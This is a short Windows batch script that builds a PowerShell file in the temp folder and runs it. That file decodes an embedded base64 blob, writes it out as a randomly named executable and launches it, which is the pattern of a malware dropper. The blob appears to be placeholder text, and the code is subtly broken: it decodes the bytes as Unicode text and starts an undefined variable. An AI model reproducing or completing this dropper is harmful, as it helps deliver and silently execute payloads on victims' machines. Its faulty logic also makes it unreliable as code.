@echo $base64 = "0J/RgNC+0YHRgtC+INGC0LXRgdGCLCDQtdGB0LvQuCDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0LfQsNC80LXQvdGOINC90LAg0YDQtdCw0LvRjNC90YvQuSDQutC+0LQK0KPQsdGA0LDQuyDRh9GC0L4t0LHRiyDRgtGLINC90LUg0LTRg9C80LDQuyDQv9C+0Lsg0LPQvtC00LAgOik=" >> %temp%\wio4nfosn4otnsa.ps1
@echo $bytes = [Convert]::FromBase64String($base64) >> %temp%\wio4nfosn4otnsa.ps1
@echo $text = [System.Text.Encoding]::Unicode.GetString($bytes) >> %temp%\wio4nfosn4otnsa.ps1
@echo $e = "$env:TEMP\wkfpzmwopynsowntovmsxp.exe" >> %temp%\wio4nfosn4otnsa.ps1
@echo [IO.File]::WriteAllText($e, $text, [System.Text.Encoding]::Unicode) >> %temp%\wio4nfosn4otnsa.ps1
@echo Start-Process $exePath >> %temp%\wio4nfosn4otnsa.ps1

start powershell.exe %temp%\wio4nfosn4otnsa.ps1
